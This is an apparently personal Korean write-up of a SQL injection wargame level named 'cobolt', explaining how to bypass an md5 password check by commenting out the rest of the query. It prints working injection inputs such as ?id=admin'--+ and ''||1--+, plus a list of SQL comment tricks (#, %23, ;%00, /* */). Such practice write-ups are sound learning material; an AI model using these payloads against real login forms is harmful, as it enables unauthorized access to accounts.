## Q2. cobolt _ 다양한 주석 모음
<img src="/photo/prob_02.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: X <br> 문제 사항: 쿼리문 참으로 만들기 
### 해결책

```
현재 쿼리문에서 pw에 md5함수 사용됨
=> pw 이용 X
=> id 변수 뒤를 주석처리해 pw를 제거
```
```diff
# 현재 쿼리문: where id=''--+'
```
```
id가 admin임 나와 있음
=> id 변수에 admin 넣고 주석처리
```
```
해결 쿼리문: where id=''||1--+'
```
### CERT <br> ?id=admin'--+

### 느낀점
```diff
+ 다양한 주석을 배웠다.
+ 1. --+- / -- -
+ 2. # (%23 : url 인코딩)
+ 3. ;%00
+ 4. /* */
```
